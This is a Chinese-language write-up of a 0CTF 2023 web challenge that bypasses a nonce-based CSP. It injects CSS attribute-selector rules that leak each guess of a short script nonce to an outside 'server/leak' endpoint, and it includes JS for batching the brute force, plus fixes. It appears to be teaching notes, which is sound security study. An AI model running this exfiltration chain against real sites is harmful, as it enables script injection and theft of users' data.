# 0CTF 2023 筆記 (CSP nonce bypass)

原文 https://www.ctfiot.com/151194.html

## 题目概览
- URL hash 解析 + DOM XSS（`innerHTML = data.content`）
- CSP 限制严格（nonce-based script-src）
- 30s admin bot

## CSP
```html
<meta http-equiv="Content-Security-Policy"
  content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
```

## 关键漏洞
- `style-src 'unsafe-inline'` → 注入 CSS
- `data.content` 直接 `innerHTML` → 注入 HTML（但不能跑 script，因为没有 nonce）
- 拿到 nonce 就能跑 script

## 攻击：CSS 偷 nonce
nonce 是 3 字符（a-z0-9），36³ = 46656 种可能。

```css
script[nonce*="aaa"]{--aaa: url("https://server/leak?q=aaa")}
script[nonce*="aab"]{--aab: url("https://server/leak?q=aab")}
...
script[nonce*="ZZZ"]{--ZZZ: url("https://server/leak?q=ZZZ")}

script {
    display: block;
    background-image: -webkit-cross-fade(
        var(--aaa, none),
        -webkit-cross-fade(
            var(--aab, none), var(--ZZZ, none), 50%
        ),
        50%
    )
}
```

## 三批爆破
```js
const arr = []
for (let a of chars) for (let b of chars) for (let c of chars) arr.push(a+b+c)
const third = Math.floor(arr.length / 3)
const arr1 = arr.slice(0, third)
const arr2 = arr.slice(third, 2 * third)
const arr3 = arr.slice(2 * third)
// 3 个 payload 文件分别触发，每批 ~15500 个 CSS 规则
```

## 教学价值
- **CSP nonce 太短可爆破**：3 字符 = 46656 种
- **CSS 属性选择器** `[attr*=val]` 可逐字符泄露
- **webkit-cross-fade** 触发 background-image 请求
- **style-src unsafe-inline** 必杀 CSP 防御
- **DOM XSS** 永远不要 innerHTML 不可信数据
- 真实浏览器利用链：ngrok / webhook.site / burp collaborator
- puppeteer admin bot 30s 窗口期

## 修复
- nonce 用 CSPRNG 生成至少 16 字节
- 用 DOMPurify sanitize HTML
- 禁用 style-src unsafe-inline
- 加 subresource-integrity (SRI)

## 工具
- puppeteer 触发 admin bot
- ngrok 暴露本地 46656 个 leak endpoint
- CSS 选择器：script[nonce*=X] 配 var(--X)
